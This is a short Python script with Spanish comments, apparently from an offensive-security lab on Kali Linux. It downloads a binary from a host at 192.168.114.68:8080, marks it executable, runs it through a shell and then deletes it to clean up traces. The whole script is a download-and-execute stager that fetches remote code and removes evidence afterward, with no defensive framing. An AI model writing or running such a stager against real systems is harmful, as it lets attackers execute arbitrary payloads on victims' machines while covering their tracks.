#!/usr/bin/python3
import requests
import subprocess

print('[+] Creating file.')
file = open('code.bin','x')#Creamos un fichero para guardar el binario.
file = open("code.bin",'wb') # vamos a escribir en binario (wb).

print("[+] File created and open. Writing Content.")
response = requests.get('http://192.168.114.68:8080/object')
file.write(response.content)#Realizamos la request y escribimos el contenido sobre el fichero abierto anteriormente y lo cerramos.

print("[+] File writed with the binary. CLosing file.")
file.close()

print("[+] Executing binary.")#Seguidamente, utilizamos el modulo 'subprocess'para ejecutar un comando que corra el binario.
subprocess.call("chmod +x /home/kali/code.bin; /home/kali/code.bin", shell=True)

print("[+] Finish. Cleaning enviroment.")
subprocess.call("rm /home/kali/code.bin", shell=True)#Finalmente, con los contenidos desplegados borramos el c√≥digo del binario pues ya no nos hace falta.
